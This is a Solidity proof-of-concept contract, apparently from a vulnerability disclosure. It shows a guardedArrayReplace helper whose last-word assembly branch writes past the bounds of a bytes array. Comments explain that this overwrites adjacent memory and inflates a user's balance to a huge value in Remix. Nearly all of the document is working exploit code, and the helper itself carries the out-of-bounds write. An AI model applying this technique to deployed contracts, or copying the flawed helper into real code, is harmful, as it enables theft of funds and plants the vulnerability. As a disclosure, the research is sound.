

//Here we use Remix to demonstrate the result.
// It is worth noting that, initially we don’t assign any value to _rewards and balances. 
//After the exploitation, the user balance is set to an extremely large value (as shown in the red rectangle).
contract PoC {
    mapping(address=>uint) public balances;
    event T(uint256,uint256,uint256);
    function test() external {
        bytes memory a = abi.encode(keccak256("123"));
        bytes memory b = abi.encode(keccak256("456"));
        uint[] memory _rewards = new uint[](1);
        bytes memory mask = abi.encode(keccak256("123"));
        bytes memory d = abi.encode(keccak256("eee"));
        bytes memory d1 = abi.encode(keccak256("eee"));
        bytes memory d3 = abi.encode(keccak256("eee"));
        bytes memory d4 = abi.encode(keccak256("eee"));
        bytes memory d5 = abi.encode(keccak256("eee"));
        guardedArrayReplace(b, a, mask);
        for(uint i = 0; i < _rewards.length; i++){
            uint256 amt = _rewards[i];
            balances[msg.sender] += amt;
        }
    }
    function guardedArrayReplace(bytes memory array, bytes memory desired, bytes memory mask)
        internal
        pure
    {
        require(array.length == desired.length, "Arrays have different lengths");
        require(array.length == mask.length, "Array and mask have different lengths");
        uint words = array.length / 0x20;
        uint index = words * 0x20;
        assert(index / 0x20 == words);
        uint i;
        for (i = 0; i < words; i++) {
            /* Conceptually: array[i] = (!mask[i] && array[i]) || (mask[i] && desired[i]), bitwise in word chunks. */
            assembly {
                let commonIndex := mul(0x20, add(1, i))
                let maskValue := mload(add(mask, commonIndex))
                mstore(add(array, commonIndex), or(and(not(maskValue), mload(add(array, commonIndex))), and(maskValue, mload(add(desired, commonIndex)))))
            }
        }
        /* Deal with the last section of the byte array. */
        if (words > 0) {
            /* This overlaps with bytes already set but is still more efficient than iterating through each of the remaining bytes individually. */
            i = words;
            assembly {
                let commonIndex := mul(0x20, add(1, i))
                let maskValue := mload(add(mask, commonIndex))
                mstore(add(array, commonIndex), or(
                    and(not(maskValue), 
                    mload(
                        add(array, commonIndex))), and(maskValue, mload(add(desired, commonIndex))))
                )
            }
        } else {
            /* If the byte array is shorter than a word, we must unfortunately do the whole thing bytewise.
               (bounds checks could still probably be optimized away in assembly, but this is a rare case) */
            for (i = index; i < array.length; i++) {
                array[i] = ((mask[i] ^ 0xff) & array[i]) | (mask[i] & desired[i]);
            }
        }
    }
}